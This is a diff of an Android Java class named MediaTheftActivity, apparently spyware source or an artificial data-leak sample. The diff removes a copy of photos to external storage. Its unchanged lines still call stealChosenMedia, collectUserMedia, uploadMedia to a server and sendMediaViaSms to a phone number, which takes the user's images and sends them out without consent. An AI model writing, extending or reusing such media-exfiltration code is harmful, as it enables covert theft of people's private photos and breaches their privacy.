@@ -9,7 +9,6 @@ import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.Environment;
 import android.provider.MediaStore;
 import android.telephony.SmsManager;
 
@@ -39,7 +38,6 @@ public class MediaTheftActivity extends Activity {
         stealChosenMedia(chosenMedia, destination, server);
 
         ArrayList<Uri> media = collectUserMedia();
-        copyToExternalStorage(media);
         copyToControlledDirectory(media, directory);
         uploadMedia(media, server);
         sendMediaViaSms(media, phone);
@@ -90,12 +88,6 @@ public class MediaTheftActivity extends Activity {
         } catch (IOException e) {
             return;
         }
-
-        File backup = new File(Environment.getExternalStorageDirectory(), "chosen.jpg");
-        try (OutputStream out = new FileOutputStream(backup)) {
-            out.write(bytes);
-        } catch (IOException ignored) {
-        }
         copyToControlledProvider(bytes, destination);
         upload(bytes, server);
     }
@@ -109,17 +101,6 @@ public class MediaTheftActivity extends Activity {
         try (OutputStream out = getContentResolver().openOutputStream(Uri.parse(destination))) {
             out.write(media);
         } catch (IOException ignored) {
-        }
-    }
-
-    private void copyToExternalStorage(ArrayList<Uri> media) {
-        for (Uri uri : media) {
-            File destination = new File(Environment.getExternalStorageDirectory(),
-                    "backup_" + uri.getLastPathSegment());
-            try (OutputStream out = new FileOutputStream(destination)) {
-                out.write(read(uri));
-            } catch (IOException ignored) {
-            }
         }
     }
 
